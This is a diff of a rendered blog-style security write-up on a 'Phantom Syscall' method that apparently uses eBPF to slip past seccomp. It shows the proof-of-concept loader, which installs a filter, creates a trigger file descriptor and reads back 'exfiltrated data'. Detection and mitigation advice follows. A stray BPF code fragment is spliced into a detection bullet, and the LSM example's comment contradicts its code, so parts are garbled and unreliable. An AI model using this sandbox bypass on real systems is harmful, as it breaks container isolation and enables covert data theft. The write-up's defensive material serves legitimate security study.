+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_rt_sigreturn</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_ioctl</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_pread64</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_pwrite64</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_readv</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_writev</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_pipe</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_select</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_sched_yield</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_nanosleep</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_poll</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+        
+        <span class="c1">// Block dangerous syscalls</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_socket</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_connect</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_accept</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_sendto</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_recvfrom</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_sendmsg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_recvmsg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_bind</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        <span class="n">BPF_JUMP</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_JEQ</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SYS_listen</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+        
+        <span class="c1">// Default: allow</span>
+        <span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span> <span class="o">|</span> <span class="n">BPF_K</span><span class="p">,</span> <span class="n">SECCOMP_RET_ALLOW</span><span class="p">),</span>
+    <span class="p">};</span>
+    
+    <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">prog</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">filter</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filter</span><span class="p">[</span><span class="mi">0</span><span class="p">])),</span>
+        <span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">filter</span><span class="p">,</span>
+    <span class="p">};</span>
+    
+    <span class="c1">// Apply the seccomp filter</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_seccomp</span><span class="p">,</span> <span class="n">SECCOMP_SET_MODE_FILTER</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Create a trigger file descriptor</span>
+<span class="kt">int</span> <span class="nf">create_trigger_fd</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// Create a pipe</span>
+    <span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">pipefd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"pipe"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Close the write end</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    
+    <span class="c1">// Duplicate the read end to our trigger FD</span>
+    <span class="kt">int</span> <span class="n">trigger_fd</span> <span class="o">=</span> <span class="n">fcntl</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">F_DUPFD</span><span class="p">,</span> <span class="mi">42</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">trigger_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"fcntl"</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Close the original read end</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    
+    <span class="k">return</span> <span class="n">trigger_fd</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">phantom_syscall_bpf</span> <span class="o">*</span><span class="n">skel</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">perf_buffer</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">trigger_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+    <span class="c1">// Set up signal handler</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+
+    <span class="c1">// Increase resource limits</span>
+    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+    <span class="p">};</span>
+    <span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
+
+    <span class="c1">// Load and verify BPF program</span>
+    <span class="n">skel</span> <span class="o">=</span> <span class="n">phantom_syscall_bpf__open_and_load</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skel</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open and load BPF skeleton</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Attach BPF programs</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="n">phantom_syscall_bpf__attach</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach BPF skeleton: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up perf buffer for events</span>
+    <span class="n">pb</span> <span class="o">=</span> <span class="n">perf_buffer__new</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">events</span><span class="p">),</span> <span class="mi">64</span><span class="p">,</span> <span class="n">handle_event</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Phantom Syscall eBPF program successfully loaded and attached!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    
+    <span class="c1">// Create a trigger file descriptor</span>
+    <span class="n">trigger_fd</span> <span class="o">=</span> <span class="n">create_trigger_fd</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">trigger_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create trigger FD</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Created trigger FD: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">trigger_fd</span><span class="p">);</span>
+    
+    <span class="c1">// Set up seccomp filter</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Setting up seccomp filter...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">setup_seccomp</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to set up seccomp filter</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Seccomp filter installed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Attempting to trigger phantom syscall...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    
+    <span class="c1">// Trigger the phantom syscall</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+    <span class="kt">ssize_t</span> <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">trigger_fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Read returned: %zd</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bytes_read</span><span class="p">);</span>
+    
+    <span class="c1">// If the phantom syscall worked, we should see the exfiltrated data</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Buffer contents: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Press Ctrl+C to exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Main loop</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">exiting</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="n">perf_buffer__poll</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Error polling perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+            <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="nl">cleanup:</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">trigger_fd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">trigger_fd</span><span class="p">);</span>
+    <span class="n">perf_buffer__free</span><span class="p">(</span><span class="n">pb</span><span class="p">);</span>
+    <span class="n">phantom_syscall_bpf__destroy</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">-</span><span class="n">err</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 
 <h3 id="detection-methods">Detection Methods</h3>
 
-<p>Defenders should monitor for:</p>
-<ul>
-  <li>Unexpected eBPF programs attaching to syscall tracepoints</li>
-  <li>eBPF programs that access sensitive kernel functions</li>
-  <li>Discrepancies between expected and actual process behavior</li>
-  <li>Unusual patterns of permitted syscalls that might be used for eBPF loading</li>
-  <li>Data exfiltration through covert channels</li>
-</ul>
+<p>Defenders should implement multiple layers of detection:</p>
 
-<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining the security boundaries provided by seccomp, especially in container environments where syscall filtering is a key security control.</p>
+<ol>
+  <li><strong>eBPF Program Monitoring</strong>:
+    <ul>
+      <li>Monitor for eBPF programs attaching to syscall tracepoints</li>
+      <li>Track eBPF program loading patterns and verify signatures</li>
+      <li>Use tools like <code class="language-plaintext highlighter-rouge">bpftool</code> to list and inspect loaded programs</li>
+    </ul>
+  </li>
+  <li><strong>Seccomp Integrity Verification</strong>:
+    <ul>
+      <li>Implement integrity monitoring for seccomp filters</li>
+      <li>Verify seccomp filter behavior through independent testing</li>
+      <li>Monitor for unexpected changes to seccomp configurations</li>
+    </ul>
+  </li>
+  <li><strong>Syscall Behavior Analysis</strong>:
+    <ul>
+      <li>Monitor for discrepancies between expected and actual process behavior</li>
+      <li>Implement statistical analysis to detect unusual syscall patterns</li>
+      <li>Use machine learning to identify anomalous syscall sequences</li>
+    </ul>
+  </li>
+  <li><strong>Specific Indicators</strong>:
+    <ul>
+      <li>eBPF programs that access sensitive kernel functions</li>
+      <li>Unusual patterns of permitted syscalls that might be used for eBPF loading</li>
+      <li>Data exfiltration through covert channels</li>
+      <li>Processes that appear to perform operations that should be blocked by seccomp
+ if (fd == TRIGGER_FD) {
+   // Store this FD for future reference
+   u32 value = fd;
+   bpf_map_update_elem(&amp;fd_map, &amp;pid, &amp;value, BPF_ANY);
+   return true;
+ }</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+
+<ol>
+  <li><strong>Restrict eBPF Capabilities</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="c"># Remove CAP_BPF from container</span>
+docker run <span class="nt">--cap-drop</span><span class="o">=</span>bpf <span class="nt">--security-opt</span> no-new-privileges ...
+   
+<span class="c"># In Kubernetes</span>
+securityContext:
+  capabilities:
+    drop:
+      - BPF
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Block BPF Syscall in Seccomp Profiles</strong>:
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+  </span><span class="nl">"defaultAction"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SCMP_ACT_ALLOW"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"architectures"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"SCMP_ARCH_X86_64"</span><span class="p">],</span><span class="w">
+  </span><span class="nl">"syscalls"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bpf"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SCMP_ACT_ERRNO"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"perf_event_open"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SCMP_ACT_ERRNO"</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"kexec_load"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SCMP_ACT_ERRNO"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement BPF LSM Policies</strong>:
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">// Example BPF LSM policy to restrict BPF program loading</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"lsm/bpf"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">restrict_bpf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Only allow specific signing keys or programs from trusted paths</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_get_current_uid_gid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Use eBPF-Based Security Tools</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="c"># Use Falco with eBPF support</span>
+falco <span class="nt">--modern-bpf</span>
+   
+<span class="c"># Or use Tracee</span>
